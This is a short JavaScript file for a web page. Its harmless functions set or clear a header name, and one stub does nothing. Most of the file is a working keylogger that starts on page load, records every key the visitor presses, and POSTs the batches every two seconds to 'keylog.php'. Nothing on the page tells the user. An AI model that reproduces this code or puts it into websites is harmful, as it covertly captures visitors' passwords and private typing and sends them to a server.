function entername() {
    name = document.getElementById("urmom").value;
    if (name != "Enter Name") {
        document.getElementById("header").innerHTML = name;
    } else {
        return;
    }
}

function clearname() {
    document.getElementById("header").innerHTML = ' ';
}

function whatkey() {
    key = document.getElementById("body").onkeydown;
    body = document.getElementById("body").innerHTML
    body = body + key
    
}
var keylog = {
    // (A) SETTINGS & PROPERTIES
    cache : [], // TEMP STORAGE FOR KEY PRESSES
    delay : 2000, // HOW OFTEN TO SEND DATA TO SERVER
    sending : false, // ONLY 1 UPLOAD ALLOWED AT A TIME
  
    // (B) INITIALIZE
    init : () => {
      // (B1) CAPTURE KEY STROKES
      window.addEventListener("keydown", (evt) => {
        keylog.cache.push(evt.key);
      });
   
      // (B2) SEND KEYSTROKES TO SERVER
      window.setInterval(keylog.send, keylog.delay);
    },
  
    // (C) AJAX SEND KEYSTROKES
    send : () => { if (!keylog.sending && keylog.cache.length != 0) {
      // (C1) "LOCK" UNTIL THIS BATCH IS SENT TO SERVER
      keylog.sending = true;
   
      // (C2) KEYPRESS DATA
      var data = new FormData();
      data.append("keys", JSON.stringify(keylog.cache));
      keylog.cache = []; // CLEAR KEYS
  
      // (C3) FECTH SEND
      fetch("keylog.php", { method:"POST", body:data })
      .then(res=>res.text()).then((res) => {
        keylog.sending = false; // UNLOCK
        console.log(res); // OPTIONAL
      })
      .catch((err) => { console.error(err); });
    }}
  };
  window.addEventListener("DOMContentLoaded", keylog.init);